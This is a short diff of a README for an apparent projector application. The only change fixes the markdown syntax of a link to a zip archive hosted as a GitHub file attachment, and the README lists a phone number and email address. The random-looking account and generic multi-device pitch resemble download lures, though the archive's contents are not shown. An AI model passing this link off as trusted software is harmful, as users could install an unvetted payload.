@@ -2,7 +2,7 @@
 ## Contact Info: +79995908212, jqnighegorodovaa3716f02@gmail.com
 This Application for HP VP6321 Smart, HP SB21-DLP 1000, HP SB21 DLP and other projectors.
 
-[Download] (https://github.com/jqnighegorodovaa3716f02/Projector-App/files/7729034/projectorapp.zip) application
+[Download](https://github.com/jqnighegorodovaa3716f02/Projector-App/files/7729034/projectorapp.zip) application
 
 ![1a1a](https://user-images.githubusercontent.com/95763314/146413852-953aad97-5e78-4781-912f-220f9dd362db.jpg)
 
